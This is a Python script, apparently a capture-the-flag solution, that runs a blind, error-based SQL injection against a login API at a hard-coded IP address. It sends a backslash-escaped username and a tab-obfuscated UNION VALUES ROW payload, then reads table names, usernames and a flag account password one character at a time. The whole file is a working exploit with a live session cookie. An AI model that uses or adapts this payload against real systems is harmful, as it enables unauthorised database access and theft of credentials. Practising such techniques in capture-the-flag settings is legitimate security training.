from string import hexdigits
from time import time
import requests
import string

s = '!'+'\"'+string.digits+':'+string.ascii_uppercase+'_'+'`'+string.ascii_lowercase+'@'


url = "http://39.107.115.3:64216/api/api.php?command=login"
cookies = {"PHPSESSID": "tmmkdq99lu5f200fr7gc888plr"}
headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://101.43.122.252:8081", "Referer": "http://101.43.122.252:8081/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7,en-US;q=0.6", "Connection": "close"}

r = ''
for i in range(1,40):
    for j in s:
        #获取表名和数据库名
        # data = {"username": "admin\\", "password": "union\tvalues\trow(1,2,3,case\twhen((binary\t{},2)>(table\tinformation_schema.TABLESPACES_EXTENSIONS\tlimit\t6,1))then(~0+1)else(3)end)#".format('0x'+(r+j).encode().hex())}
        #获取用户名
        # data = {"username": "admin\\", "password": "union\tvalues\trow(1,2,3,case\twhen((3,binary\t{},2,1)>(table\tctf.users\tlimit\t2,1))then(~0+1)else(3)end)#".format('0x'+(r+j).encode().hex())}
        
        #获取密码
        data = {"username": "admin\\", "password": "union\tvalues\trow(1,2,3,case\twhen((3,0x466c61675f4163636f756e74,binary\t{},2)>(table\tctf.users\tlimit\t2,1))then(~0+1)else(3)end)#".format('0x'+(r+j).encode().hex())}

        try:
            res = requests.post(url, headers=headers,cookies=cookies, data=data,allow_redirects=False,timeout=3)
            if "msg" not in res.text:
                r+=chr(ord(j)-1)
                print(r)
                break
        except:
            pass